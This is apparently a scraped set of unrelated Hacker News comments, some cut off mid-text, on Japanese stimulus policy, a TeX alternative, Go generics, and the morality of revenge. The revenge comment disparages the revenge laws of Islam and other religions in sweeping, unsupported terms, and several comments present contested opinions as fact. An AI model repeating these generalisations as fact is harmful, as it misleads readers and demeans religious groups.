Look at the number of companies and major industries and revenues in both areas and you&#x27;ll be in for a good laugh. And in case you did not know, many large companies are leaving Kansai. Not to return.<p>> Japan has managed to keep its unemployment level pretty low and has had a protracted albeit mild depression over the last 20 years. This is undeniable.<p>Low unemployment in Asia is not hard. Ever seen how many people are working for super low salaries, doing nothing but making sure people don&#x27;t go over the cones put on the side of the road? The whole service industry in Japan guarantees low unemployment rates, this has NOTHING to do with stimulus. It&#x27;s just the way Japanese approach services in the first place anyway.<p>> The alternative (no stimulus at all / spiraling self-reinforcing depression) would have resulted in ending up like Greece or Spain. This is also undeniable.<p>No, it would have resulted in unprofitable businesses going bankrupt, followed by a short recession and coming back to a period of growth. Instead of that, the Stimulus is making the recession last forever, and there&#x27;s no end in sight. But you are probably one the guys who think devaluating 40% of the Yen value is the best way to increase Japan&#x27;s productivity. Abenomics all the way !",1412157293

It also states image handling is still rudimentarily available (only PNG files, for example). I also am not really impressed by the type setting from the PDF, but this might be due to its focus on the engine and not the aesthetics of the typesetting (which will hopefully addressed soon to convince Tex users!).<p>Personally I don&#x27;t &quot;program&quot; in Tex, I only write. The benefits with regard to (La)Tex therefore seems minor to me. However, if you program in Tex (like, designing templates perhaps?)

If you know, I&#x27;d kindly ask you to explain why you think the current implementation could not be extended to user-defined types.<p>> Generics aren&#x27;t free. You will always pay for it in terms of some combination of implementation complexity, runtime performance and compiler performance.<p>I don&#x27;t argue about implementation complexity and compiler performance, I&#x27;m just saying that I assume that most that complexity is already present in the Go compiler.<p>However, I think that saying that generics have runtime performance cost is disingenuous. It&#x27;s like saying that functions aren&#x27;t free. Now, obviously it&#x27;s possible to program without function by using loops, gotos or inlining code. However, if you want to make your program more abstract, you&#x27;ll end up implementing functions, along with calling conventions, register saving, varargs, ... It&#x27;s easier if the compiler does that for you (also, sometimes the compiler will compile functions into loops, gotos or inlined code, reducing the performance penalty).<p>It&#x27;s the same with generics. If you have an algorithm that you want to use with different data types, you can either (1) implement it multiple times, or (2) manually box and unbox all values. That&#x27;s exactly what the compiler can do for you if you write the code using generics. The fact that most compilers use just one of these strategies is not a deficiency of generics, but the deficiency of compilers. Both Scala and .Net use both specialization and boxing. Therefore, in all honesty, I really see no additional runtime cost to generics that wouldn&#x27;t be present in equivalent non-generic code.",1412155781

You&#x27;re talking about revenge, and the Christian moral position is of course, that nothing justifies revenge.<p>(But keep in mind, Judaism, Hinduism, Islam, Buddhism and others all regulate revenge instead. Revenge is certainly justified under those moral systems, and the revenge is usually bigger than the event that &quot;justified&quot; the revenge. Judaism, but especially Islam is especially famous for having revenge punishments so extreme (I should say so extremely stupid) that they have triggered civil wars on occasion (of course these come from the Roman Empire&#x27;s late-empire laws, which had a justice system that can reasonably  be called &quot;based on terror&quot;). Which moral system is right ?)<p>The moral issue here is the duty to stop or at least contain moral wrongs in progress, e.g. this Unit 731, the Soviet Union, ... The key difference being that revenge is after the fact and is unnecessary. The key thing about revenge is that it makes society worse off in the short term, both the person taking revenge and the person being punished (e.g. kids destroying a toy rather than giving it back).<p>To fight moral wrongs in progress the moral position is that it is justified to use any amount of force, but comparable force should be tried first. Collateral damage should be avoided, but if you can&#x27;t stop a criminal without causing collateral damage, then it is acceptable to, for example, destroy property (if the police destroys your front door chasing a robber, you will not receive compensation, nor if they burn down your house, though insurance usually covers this). If someone fights, beat him a bit and lock him up. If someone has a knife or a gun and is (trying to) kill people, shoot him.
